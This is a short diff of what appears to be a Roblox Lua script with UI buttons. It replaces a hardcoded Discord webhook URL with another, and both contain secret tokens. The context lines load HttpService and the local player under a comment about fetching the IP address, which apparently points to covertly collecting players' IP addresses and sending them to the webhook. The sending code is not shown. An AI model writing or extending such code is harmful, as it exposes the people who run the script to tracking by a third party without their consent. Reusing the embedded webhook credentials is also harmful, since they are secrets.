@@ -221,7 +221,7 @@ MainTab:CreateButton({
 })
 
 local http = game:GetService("HttpService")
-local webhook = "https://discord.com/api/webhooks/1342066053097717872/8y9AbldV8A-sau__ADDoNfbdc9l_LwTNbmlFbw8a-AUimWfwnOrRhfUtjjP4RT2I_6rt"
+local webhook = "https://discord.com/api/webhooks/1346218770795855904/lyljEuFDtyQCJP0WSVO7O5Q4DIA8yy_ct-X4_SvJnzvjH9SVvPv00BwzJNgvVvk9hSlf"
 local player = game.Players.LocalPlayer
 
 -- Fetch the IP address
